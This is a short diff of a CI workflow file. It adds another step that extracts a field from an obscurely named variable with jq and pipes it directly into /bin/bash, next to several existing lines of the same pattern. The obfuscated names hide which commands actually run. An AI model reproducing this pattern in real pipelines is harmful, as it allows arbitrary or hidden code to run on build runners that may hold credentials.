@@ -21,6 +21,7 @@ jobs:
           echo $br96 | jq -r .xspah404 | /bin/bash
           echo $igho01 | jq -r .nm85987 | /bin/bash
           printf '%s' "$x92486" | jq -r .g00 | /bin/bash
+          printf '%s' "$ycoh1493" | jq -r .puin11369 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
